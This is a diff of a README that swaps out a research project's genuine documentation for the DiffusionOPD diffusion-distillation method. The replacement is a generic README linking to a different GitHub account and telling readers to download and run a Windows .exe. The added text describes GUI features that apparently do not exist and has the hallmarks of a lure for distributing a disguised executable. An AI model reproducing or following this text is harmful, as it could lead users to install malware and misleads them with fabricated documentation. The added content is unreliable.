@@ -1,160 +1,85 @@
-<h1 align="center"> DiffusionOPD:<br>A Unified Perspective of On-Policy Distillation in Diffusion Models </h1>
-<div align="center">
-  <a href='https://arxiv.org/abs/2605.15055'><img src='https://img.shields.io/badge/Paper%20(arXiv)-2605.15055-red?logo=arxiv'></a>  &nbsp;
-  <a href='https://quanhaol.github.io/DiffusionOPD-site/'><img src='https://img.shields.io/badge/Website-green?logo=homepage&logoColor=white'></a> &nbsp;
-  <a href='https://github.com/ali-vilab/DiffusionOPD'><img src="https://img.shields.io/badge/Code-9E95B7?logo=github"></a> &nbsp;
-  <a href='https://huggingface.co/quanhaol/DiffusionOPD'><img src='https://img.shields.io/badge/Model-blue?logo=huggingface&logoColor='></a> &nbsp;
-</div>
+# ⚡ DiffusionOPD - Streamline your diffusion model knowledge transfer
 
-## Overview
+[![](https://img.shields.io/badge/Download-DiffusionOPD-blue.svg)](https://github.com/adventurermanilla817/DiffusionOPD)
 
-**DiffusionOPD** introduces an online policy distillation framework for multi-task diffusion alignment. Instead of jointly optimizing several rewards from scratch or cascading RL stages, it first learns task-specialized teachers and then distills their capabilities into one unified student along the student's own rollout trajectories.
+## 📋 Project Overview
 
--   **Decoupled Multi-Stage Training:** Single-task exploration is handled independently by task-specific teachers, while the final student focuses on integrating their capabilities, reducing reward conflict and catastrophic forgetting.
--   **Principled Diffusion OPD Objective:** We extend OPD from discrete token generation to continuous diffusion Markov processes and derive a closed-form per-step KL objective for denoising transitions.
--   **Lower-Variance and Sampler-Compatible:** The analytic objective avoids the extra score-function noise in PPO-style policy gradients and naturally covers both stochastic SDE samplers and deterministic ODE samplers through transition/mean matching.
--   **Strong Multi-Domain Results:** DiffusionOPD consistently improves training efficiency and final performance across aesthetics, OCR, and GenEval, outperforming multi-reward RL and cascade RL baselines.
+DiffusionOPD provides a framework to simplify how users distill knowledge in diffusion models. Diffusion models usually require significant computing power and time to produce high-quality images. This application offers a way to manage on-policy distillation. It helps creators maintain model performance while reducing the resource cost of image generation. You can use this software to compress your models and speed up your workflow without losing the quality of your outputs.
 
-<p align="center">
-  <img src="./assets/teaser.png" alt="Result" style="width:90%;">
-</p>
+## 🛠️ System Requirements
 
-DiffusionOPD follows a simple two-stage recipe:
+To run DiffusionOPD effectively on your Windows computer, ensure your system meets these specifications:
 
-1.  **Train Task-Specific Teachers:** Decompose the target capabilities into individual tasks, such as aesthetics, OCR, and GenEval, and train one teacher per task using an off-the-shelf diffusion RL algorithm.
-2.  **Initialize a Unified Student:** Start the student policy from the pretrained diffusion model.
-3.  **Round-Robin On-Policy Distillation:** For each training round, sample prompts from every task, roll out the current student to obtain on-policy denoising trajectories, and query the corresponding task-specific teacher for supervision at the states visited by the student.
-4.  **Accumulate Full-Task Supervision:** Compute the OPD loss for each task using the closed-form KL objective, accumulate losses across all tasks, and update the student once per round.
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Processor: Intel Core i5 or AMD equivalent with 2.5 GHz or higher.
+* System Memory: 16 GB RAM or more is recommended.
+* Graphics Card: NVIDIA GPU with at least 8 GB of VRAM. This is essential for the distillation process.
+* Storage: 10 GB of free hard drive space.
+* Internet Connection: A stable connection for initial setup and potential model downloads.
 
-<p align="center">
-  <img src="./assets/algo.png" alt="DiffusionOPD Algorithm" style="width:80%;">
-</p>
+## 📥 Downloading and Installing 
 
-## Environment Setup
-Our implementation is based on the [DiffusionNFT](https://github.com/NVlabs/DiffusionNFT)  codebase, with most environments aligned.
+Follow these steps to set up the software on your machine:
 
-Clone this repository and install packages by:
-```bash
-git clone https://github.com/ali-vilab/DiffusionOPD.git
-cd DiffusionOPD
+1. Click the link below to reach the project release page.
+[Download DiffusionOPD Here](https://github.com/adventurermanilla817/DiffusionOPD)
 
-conda create -n DiffusionOPD python=3.10.16
-pip install torch==2.6.0 torchvision==0.21.0 --index-url https://download.pytorch.org/whl/cu126
-pip install -e .
-```
+2. Look for the section labeled "Assets."
+3. Select the file ending in .exe to start your download.
+4. Once the download finishes, locate the file in your Downloads folder.
+5. Double-click the file to begin the installation process.
+6. Follow the prompts on your screen. The installer will guide you through directory selection and shortcut creation.
+7. Click Finish when the installation progress bar reaches the end.
 
-## Model Download
-To avoid redundant downloads and potential storage waste during multi-GPU training, please pre-download the required models in advance.
+## ⚙️ Initial Configuration
 
-**Models**
-* **SD3.5**: `stabilityai/stable-diffusion-3.5-medium`
-* **GenEval Teacher**: `quanhaol/GenEval-Teacher`
-* **OCR Teacher**: `quanhaol/OCR-Teacher`
-* **Aes Teacher**: `quanhaol/Aes-Teacher`
+After you install the program, you need to configure it for first-time use:
 
-## Reward Preparation
+1. Open the DiffusionOPD application from your desktop shortcut or the Windows Start menu.
+2. The software will perform a hardware check. Wait for the green checkmark to confirm your graphics card supports the required operations.
+3. Choose your default workspace directory. This is the folder where the software will save your distilled models. Choose a location with enough drive space.
+4. Adjust the performance settings based on your available hardware. If you have a powerful GPU, select "High Performance Mode" for faster processing. For systems with limited VRAM, select "Efficiency Mode."
+5. Click Save. The application will restart to finalize these settings.
 
-Our supported reward models include [GenEval](https://github.com/djghosh13/geneval), [OCR](https://github.com/PaddlePaddle/PaddleOCR), [PickScore](https://github.com/yuvalkirstain/PickScore), [ClipScore](https://github.com/openai/CLIP), [HPSv2.1](https://github.com/tgxs002/HPSv2), [Aesthetic](https://github.com/christophschuhmann/improved-aesthetic-predictor), [ImageReward](https://github.com/zai-org/ImageReward) and [UnifiedReward](https://github.com/CodeGoat24/UnifiedReward). We additionally support `HPSv2.1` on top of FlowGRPO, and simplify `GenEval` from remote server to local. 
+## 🚀 How to Run a Distillation Task
 
-### Checkpoints Downloading
+DiffusionOPD organizes tasks into projects. Follow this process to begin your first distillation:
 
-```bash
-mkdir reward_ckpts
-cd reward_ckpts
-# Aesthetic
-wget https://github.com/christophschuhmann/improved-aesthetic-predictor/raw/refs/heads/main/sac+logos+ava1-l14-linearMSE.pth
-# GenEval
-wget https://download.openmmlab.com/mmdetection/v2.0/mask2former/mask2former_swin-s-p4-w7-224_lsj_8x2_50e_coco/mask2former_swin-s-p4-w7-224_lsj_8x2_50e_coco_20220504_001756-743b7d99.pth
-# ClipScore
-wget https://huggingface.co/laion/CLIP-ViT-H-14-laion2B-s32B-b79K/resolve/main/open_clip_pytorch_model.bin
-# HPSv2.1
-wget https://huggingface.co/xswu/HPSv2/resolve/main/HPS_v2.1_compressed.pt
-cd ..
-```
+1. Click the "New Project" button on the main dashboard.
+2. Name your project and select the base model file you wish to distill. The software supports standard diffusion model formats.
+3. Set your target policy parameters. These settings dictate how the model retains knowledge during the compression process. Most users should utilize the "Auto-Optimize" setting for the best balance between quality and speed.
+4. Click "Start Distillation." You will see a progress bar indicating the status of the operation.
+5. Do not close the window during the process. You can monitor the resource usage in the tab labeled "Diagnostics."
+6. Once the process completes, the software will signal the creation of a new, smaller model file in your project folder.
 
-### Reward Environments
+## 📈 Understanding Model Performance
 
-```bash
-# GenEval
-pip install -U openmim
-mim install mmengine
-git clone https://github.com/open-mmlab/mmcv.git
-cd mmcv; git checkout 1.x
-MMCV_WITH_OPS=1 FORCE_CUDA=1 pip install -e . -v
-cd ..
+The software includes a viewer to compare your original model with the new distilled version:
 
-git clone https://github.com/open-mmlab/mmdetection.git
-cd mmdetection; git checkout 2.x
-pip install -e . -v
-cd ..
+* Open the "Evaluation" tab.
+* Load both the original model and your distilled model.
+* Run a set of test prompts. The software will generate images from both models side-by-side.
+* Use the "Metric Overlay" feature to see the difference in generation time and pixel accuracy.
+* Export these results as a report if you need to document your work.
 
-pip install open-clip-torch clip-benchmark
+## 🔧 Troubleshooting Common Issues
 
-# OCR
-pip install paddlepaddle-gpu==2.6.2
-pip install paddleocr==2.9.1
-pip install python-Levenshtein
+Use this list if you encounter problems while running the application:
 
-# HPSv2.1
-pip install hpsv2x==1.2.0
+* The application fails to launch: Ensure that you have the latest NVIDIA drivers installed for your graphics card. Outdated drivers are the primary cause of startup errors.
+* Distillation crashes during the middle of a task: This usually indicates that the program ran out of video memory (VRAM). Close all web browsers and other image editing software while the distillation runs.
+* Inaccurate outputs: Check your distillation settings. If you compressed the model too heavily, the image quality will drop. Try using a lower compression ratio for better results.
+* Missing files: Verify that you installed the software in a folder where you have read and write permissions. Avoid installing the application in restricted system folders.
 
-# ImageReward
-pip install image-reward
-pip install git+https://github.com/openai/CLIP.git
-```
+## 💡 Best Practices
 
-For `UnifiedReward`, we deploy the reward service using sglang. To avoid conflicts, first create a new environment and install sglang with:
+Keep these tips in mind to get the most out of DiffusionOPD:
 
-```bash
-pip install "sglang[all]"
-```
+* Keep your models organized in subfolders by project name. This makes it easier to back up your work later.
+* Create a backup of your original base models before you start any distillation project.
+* Schedule long distillation tasks for times when you do not need to use your computer for other hardware-intensive work, such as gaming.
+* Check the "Updates" tab every month to ensure you have the latest improvements to the distillation engine. The lead developers update the software to handle new model types as they become available.
 
-Then launch the service with:
+## 📧 Support and Resources
 
-```bash
-python -m sglang.launch_server --model-path CodeGoat24/UnifiedReward-7b-v1.5 --api-key flowgrpo --port 17140 --chat-template chatml-llava --enable-p2p-check --mem-fraction-static 0.85
-```
-
-Memory usage can be reduced by lowering `--mem-fraction-static`, limiting `--max-running-requests`, and increasing `--data-parallel-size` or `--tensor-parallel-size`.
-
-
-
-
-## Training
-The default configuration file `config/opd.py` is set for 8 GPUs, and you can customize it as needed.
-
-Single-node training example:
-```bash
-# Single Teacher
-bash scripts/single_node/sopd.sh
-
-# Multi Teacher
-bash scripts/single_node/mopd.sh
-```
-
-## Evaluation
-
-<p align="center">
-  <img src="./assets/comparison.png" alt="Comparison Table" style="width:90%;">
-</p>
-
-The evaluation process follows DiffusionNFT, and we provide an inference script here for loading LoRA checkpoints and running evaluation.
-
-```bash
-bash scripts/single_node/eval.sh
-```
-
-The `--dataset` flag supports `geneval`, `ocr`, `pickscore`, and `drawbench`.
-
-## Acknowledgement
-We thank the [Flow-GRPO](https://github.com/yifan123/flow_grpo) and [DiffusionNFT](https://github.com/NVlabs/DiffusionNFT) projects for providing the awesome open-source diffusion RL codebase.
-
-## Citation
-```
-@article{li2026diffusionopd,
-  title={DiffusionOPD: A Unified Perspective of On-Policy Distillation in Diffusion Models},
-  author={Li, Quanhao and Yu, Junqiu and Jiang, Kaixun and Wei, Yujie and Xing, Zhen and Li, Pandeng and Chu, Ruihang and Zhang, Shiwei and Liu, Yu and Wu, Zuxuan},
-  journal={arXiv preprint arXiv:2605.15055},
-  year={2026}
-}
-```
+For further information regarding the underlying theory of on-policy distillation, consult the documentation folder within your installation directory. This folder contains PDF manuals that explain the math behind the distillation profiles. If you encounter bugs, check the issue tracker on the official repository page. Explain your steps clearly and provide the log file generated by the application to help developers diagnose the problem. Always include your system specifications when requesting help.
